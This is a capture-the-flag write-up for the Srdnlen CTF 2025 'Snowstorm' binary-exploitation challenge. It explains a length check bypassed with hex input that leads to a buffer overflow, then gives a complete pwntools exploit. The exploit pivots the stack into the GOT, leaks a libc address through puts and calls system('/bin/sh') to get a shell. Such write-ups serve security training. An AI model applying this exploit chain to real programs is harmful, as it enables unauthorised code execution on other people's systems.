# Snowstorm

## challenge information

Surdnlen CTF 2025: [challenge](https://ctf.srdnlen.it/challenges#challenge-14)
`pwn userland`

## analysis
* vulnerability
  * there is a buffer overflow vulnerability in `ask_length()`.
  ![Screenshot_20250122_221434.png](Screenshot_20250122_221434.png)
  * if the string was formatted in Hex, `strtol` return the decimal value.
  * in this case, we can bypass the size restriction by input hex value, 0x40.
* exploit plan
  * pivot stack to .got section.
  * overwrite close() -> puts()
  * return to pwnme() and earn puts(puts)
  * assemble system("/bin/sh")
## exploit
* checksec
```bash
pwndbg> checksec
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
* stack offset
  * the distance between out input and saved rbp is 0x30
```py
   0x00000000004015bd <+83>:    call   0x40136a <ask_length>
   0x00000000004015c2 <+88>:    movsxd rdx,eax
   0x00000000004015c5 <+91>:    lea    rax,[rbp-0x30]
   0x00000000004015c9 <+95>:    mov    rsi,rax
   0x00000000004015cc <+98>:    mov    edi,0x0
   0x00000000004015d1 <+103>:   call   0x401160
```
* mapping address in .got region
![Screenshot_20250122_223117.png](Screenshot_20250122_223117.png)

## solver
```Py
from pwn import *

e = ELF("snowstorm")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
ld = ELF("/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2")

context.binary = e

p = e.process()

gdb.attach(p,"""
b *pwnme+88
b *pwnme+103
b *pwnme+118
""")
# 0x00000000004015ff: or eax, 0x90fffffb; leave; ret; 
or_eax = 0x00000000004015ff
ret = 0x000000000040101a

print(p.recv())
p.send(b"0x40")
payload = b"A"*0x30
payload+= p64((e.got["strlen"])+0x30)
payload+= p64((e.sym["pwnme"])+83)
print(p.recv())
p.send(payload)

#print(p.recvuntil(b"(max 40): "))
print(p.recv())
p.send(b"0x40")
payload = p64(e.got["strlen"]) #strlen
payload+= p64(e.got["strlen"]) #printf
payload+= p64(e.plt["puts"]) #close
#payload+= p64(or_eax)
payload+= p64(0x401080) #strcspn
payload+= p64(0x401090) #read
#payload+= p64((e.got["puts"])<<32)
payload+= p32(0x404028)
payload+= p32(0x404000)
payload+= p64((e.got["strlen"])+0x30)
payload+= p64(e.sym["pwnme"]+88)
print(p.recv())
p.send(payload)

leak = u64(p.recvline().strip().ljust(8,b"\x00"))
print(f"leak: {hex(leak)}")
libc.address = leak - libc.sym["puts"]
print(f"libc@ {hex(libc.address)}")

payload = p64(0x401050) #strlen
payload+= p64(0x401050) #printf
payload+= p64(libc.sym["system"]) #close
payload+= b"/bin/sh\0" #strcspn
payload+= b"\x90"
print(p.recv())
p.send(payload)

print(p.recv())
p.send(payload)

p.interactive()
```
